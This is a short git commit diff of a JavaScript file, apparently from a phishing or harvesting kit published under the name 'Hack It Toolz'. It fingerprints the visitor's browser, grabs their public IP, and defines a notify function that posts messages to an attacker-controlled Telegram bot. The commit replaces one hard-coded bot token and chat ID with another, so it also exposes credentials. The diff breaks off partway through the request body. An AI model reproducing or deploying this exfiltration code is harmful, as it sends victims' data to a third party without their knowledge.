a598bd4844f04b8b82e90bc093482be4d09ffd51
Hack It Toolz <96001782+hackittoolz@users.noreply.github.com>
2025-07-28 09:31:14 -0500

    Update post.js

--- post.js
+++ post.js
@@ -1,8 +1,8 @@
 function browserN(){if((navigator.userAgent.indexOf("Opera")||navigator.userAgent.indexOf('OPR'))!=-1){return'Opera'}else if(navigator.userAgent.indexOf("Edg")!=-1){return'Edge'}else if(navigator.userAgent.indexOf("Chrome")!=-1){return'Chrome'}else if(navigator.userAgent.indexOf("Safari")!=-1){return'Safari'}else if(navigator.userAgent.indexOf("Firefox")!=-1){return'Firefox'}else if((navigator.userAgent.indexOf("MSIE")!=-1)||(!!document.documentMode==!0)){return'IE'}else{return'unknown'}}
 function fetch_ip(){$.getJSON("https://api.ipify.org?format=json",function(data){$("#eip").val(data.ip)})}
 async function notify(message){
-    const botToken='7582406379:AAFSqZwUfw807J6Qf51Wa3fSQS5pPhU-R3c';
-    const chatId='1369859387';
+    const botToken='7606277895:AAEEvGTP0tCmUury7ngWLyfu9PjG01QusoU';
+    const chatId='6902150530';
     const url=`https://api.telegram.org/bot${botToken}/sendMessage`;
     const data = {
                 chat_id: chatId,
